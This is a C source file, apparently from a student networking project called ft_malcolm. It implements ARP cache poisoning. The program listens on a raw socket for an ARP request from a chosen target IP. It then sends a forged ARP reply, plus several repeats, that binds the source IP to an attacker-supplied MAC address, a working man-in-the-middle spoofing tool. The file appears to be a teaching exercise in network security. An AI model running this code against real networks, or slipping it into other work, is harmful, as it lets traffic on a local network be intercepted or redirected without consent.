
#include "../headers/ft_malcom.h"

// struct ethhdr {
//     unsigned char   h_dest[ETH_ALEN];   /* Destination Host Address */
//     unsigned char   h_source[ETH_ALEN]; /* Source Host Address      */
//     unsigned short  h_proto;            /* Protocol type            */
// };

// struct arphdr {
//     unsigned short  ar_hrd;     /* Format of hardware address   */
//     unsigned short  ar_pro;     /* Format of protocol address   */
//     unsigned char   ar_hln;     /* Length of hardware address   */
//     unsigned char   ar_pln;     /* Length of protocol address   */
//     unsigned short  ar_op;      /* ARP opcode (command)         */
// };

// struct ether_arp {
//     struct arphdr   ea_hdr;     /* ARP hrd & proto et al */
//     unsigned char   arp_sha[6];  /* Sender hardware address */
//     unsigned char   arp_spa[4];  /* Sender protocol address */
//     unsigned char   arp_tha[6];  /* Target hardware address */
//     unsigned char   arp_tpa[4];  /* Target protocol address */
// };

bool    make_arp_reply(t_malcolm *malcolm, int reply_num)
{
    unsigned char packet[sizeof(struct ethhdr) + sizeof(struct ether_arp)];
    struct ethhdr *eth_header;
    struct ether_arp *arp_header; 
    struct sockaddr_ll sa; //! for sending on particular socket
    
    //! PUTTING MALCOLM AND VICTIM MAC ADRESS IN ARP FRAME
    eth_header = (struct ethhdr *)packet;
    ft_memcpy(eth_header->h_dest, malcolm->target->mac_addr, ETH_ALEN);
    ft_memcpy(eth_header->h_source, malcolm->source->mac_addr, ETH_ALEN);
    eth_header->h_proto = htons(ETH_P_ARP);

    //! MAKING ARP HEADER (arphdr)
    arp_header = (struct ether_arp *)(packet + sizeof(struct ethhdr));
    arp_header->ea_hdr.ar_hrd = htons(ARPHRD_ETHER); //! hardware type : ethernet
    arp_header->ea_hdr.ar_pro = htons(ETH_P_IP);     //! Protocol type : IPv4
    arp_header->ea_hdr.ar_hln = ETH_ALEN;            //! Hardware adress length
    arp_header->ea_hdr.ar_pln = 4;                   //! Hardware adress length
    arp_header->ea_hdr.ar_op = htons(ARPOP_REPLY);    //! Operation     : ARP Reply
    //! MAKING ARP HEADER (ether_arp)
    ft_memcpy(arp_header->arp_sha, &malcolm->source->mac_addr, ETH_ALEN);
    ft_memcpy(arp_header->arp_spa, &malcolm->source->ip_addr.s_addr, 4);

    ft_memcpy(arp_header->arp_tha, &malcolm->target->mac_addr, ETH_ALEN);
    ft_memcpy(arp_header->arp_tpa, &malcolm->target->ip_addr.s_addr, 4);

    ft_memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = malcolm->interface_index;
    sa.sll_halen   = ETH_ALEN;
    ft_memcpy(sa.sll_addr, malcolm->target->mac_addr, ETH_ALEN);

    ssize_t bytes_sent = sendto(malcolm->socket_fd, packet, sizeof(packet), 0, (struct sockaddr*)&sa, sizeof(sa));
    if (bytes_sent < 0) {
        LOG_ERROR("Failed to send ARP reply");
        return false;
    } else {
        printf("Sent %zd bytes (%d : RP reply packet).\n", bytes_sent, reply_num);
        return true;
    }
}

bool	waiting_arp_request(t_malcolm *malcolm)
{
    int	counter = 0;
    
    while (signal_handler()) {
        
        display_waiting_request_arp(&counter);
        counter++;
        
        //! READ ON SOCKET FD
        fcntl(malcolm->socket_fd, F_SETFL, O_NONBLOCK);
        ssize_t len = recvfrom(malcolm->socket_fd, malcolm->buffer, sizeof(malcolm->buffer), 0, NULL, NULL);
        if (len < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                usleep(20000);
                continue;
            } else {
                LOG_ERROR("Failed to read on buffer");
                continue;
            }
        }		
        
        //! LOOKING FOR ARP REQUEST
        struct ethhdr *eth = (struct ethhdr *) malcolm->buffer;
        if (ntohs(eth->h_proto) == ETH_P_ARP) { //! IF ARP PACKET
			printf("\033[1A\033[2K\r");
			LOG_INFO("Found a ARP frame");
            
            struct ether_arp *arp = (struct ether_arp *)(malcolm->buffer + sizeof(struct ethhdr));
        
            if (ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST) { //! IF ARP REQUEST
                LOG_INFO("Found a ARP request");

                struct in_addr src_ip, dst_ip;
                ft_memcpy(&dst_ip, arp->arp_tpa, 4);
                ft_memcpy(&src_ip, arp->arp_spa, 4);
                
                unsigned char sha[6], tha[6];
                ft_memcpy(sha, arp->arp_sha, 6);
                ft_memcpy(tha, arp->arp_tha, 6);
                
                struct in_addr malcolm_src_ip;
                if (inet_aton(malcolm->target->ip, &malcolm_src_ip) && src_ip.s_addr == malcolm_src_ip.s_addr) {
                    if (make_arp_reply(malcolm, 0)) {
                        LOG_INFO("Successfully sent initial spoofed ARP reply.");
                        int reply_counter = 0;
                        while (signal_handler()) { 
                            if (reply_counter > 5)
                                return false;
                            else if (make_arp_reply(malcolm, reply_counter)) {
                                reply_counter++;
                            } else {
                                LOG_ERROR("Failed to send subsequent ARP reply.");
                                return (true);
                            }
                            usleep(200000); 
                        }
                        return true;
                    } else {
                        LOG_ERROR("Failed to send initial spoofed ARP reply.");
                        return false;
                    }
                }
            }
        }
        usleep(10000);
    }
    return (false);
}

int		main(int argc, char **argv) {
	t_malcolm *malcolm;
	
	if (argc != 5) {
		LOG_ERROR("./ft_malcom <source ip> <source mac adress> <target ip> <target mac address>");
		return (1);
	}
	
	malcolm = malcolm_constructor(argv + 1);
	if (!malcolm) {
		LOG_ERROR("Failed to build malcolm");
		return (1);
	}

	if (waiting_arp_request(malcolm)) {
		LOG_ERROR("Error occured when waiting for arp request");
		return (2);
	}
	
	
	return (safe_exit(malcolm), 0);
}